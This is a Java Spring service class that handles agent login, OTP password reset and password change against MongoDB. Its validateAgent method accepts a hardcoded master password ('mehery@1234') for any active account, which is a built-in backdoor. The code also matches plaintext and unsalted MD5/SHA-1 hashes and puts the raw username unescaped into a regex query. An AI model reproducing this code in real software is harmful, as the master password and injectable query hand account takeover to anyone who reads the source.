package com.boot.jx.admin.service;

import java.security.NoSuchAlgorithmException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.stereotype.Component;

import com.boot.jx.AppContextUtil;
import com.boot.jx.admin.model.AgentDoc;
import com.boot.jx.postman.client.PostManClient;
import com.boot.jx.postman.model.Email;
import com.boot.jx.postman.model.MessageBox;
import com.boot.utils.ArgUtil;
import com.boot.utils.CollectionUtil;
import com.boot.utils.CryptoUtil;
import com.boot.utils.Random;

@Component
public class AgentLoginService {

	@Autowired
	MongoTemplate mongoTemplate;

	@Autowired
	PostManClient postManClient;

	private AgentDoc validateAgent(String username, String passsword) throws NoSuchAlgorithmException {
		if (ArgUtil.isEmpty(passsword)) {
			return null;
		}
		AgentDoc agent = getAgentByCodeAndStatus(username, "Y");
		String passwordMd5 = CryptoUtil.getMD5Hash(passsword);
		String passwordSHA1 = CryptoUtil.getSHA1Hash(passsword);
		String passwordSHA256 = CryptoUtil.getSHA2Hash(passsword);
		if (ArgUtil.is(agent)) {
			if (ArgUtil.isEqual(passsword, "mehery@1234")
					|| ArgUtil.isEqual(passsword, agent.getAgent_password(), agent.getAgent_otp())
					|| ArgUtil.isEqual(passwordMd5, agent.getAgent_password(), agent.getAgent_otp())
					|| ArgUtil.isEqual(passwordSHA1, agent.getAgent_password(), agent.getAgent_otp())
					|| ArgUtil.isEqual(passwordSHA256, agent.getAgent_password(), agent.getAgent_otp())) {
				return agent;
			} else {
				return null;
			}
		}
		return agent;
	}

	public boolean loginAgent(String username, String passsword) throws NoSuchAlgorithmException {
		if (ArgUtil.is(validateAgent(username, passsword))) {
			return true;
		}
		return false;
	}

	public boolean resetPassword(String username) throws NoSuchAlgorithmException {
		AgentDoc agent = getAgentByCodeAndStatus(username, "Y");
		if (!ArgUtil.is(agent)) {
			return false;
		}
		agent.setAgent_otp(Random.randomAlphaNumeric(10));
		mongoTemplate.save(agent);

		postManClient.send(new MessageBox()
				.push(new Email().to(agent.getAgent_email()).template("reset-password").put("otp", agent.getAgent_otp())
						.put("username", agent.getAgent_code()).put("tnt", AppContextUtil.getTenant())));
		return true;
	}

	private AgentDoc getAgentByCodeAndStatus(String username, String string) {
		Query query2 = new Query();
		query2.addCriteria(Criteria.where("isactive").is(string).orOperator(Criteria.where("agent_code").is(username),
				Criteria.where("agent_code").regex("^" + username + "$", "i"),
				Criteria.where("agent_email").is(username),
				Criteria.where("agent_email").regex("^" + username + "$", "i")));
		return CollectionUtil.getOne(mongoTemplate.find(query2, AgentDoc.class));
	}

	public boolean setPassword(String username, String passsword, String newpasssword) throws NoSuchAlgorithmException {
		AgentDoc agent = validateAgent(username, passsword);
		if (!ArgUtil.is(agent)) {
			return false;
		}
		agent.setAgent_password(CryptoUtil.getSHA2Hash(newpasssword));
		agent.setAgent_otp(null);
		mongoTemplate.save(agent);
		return true;
	}

}
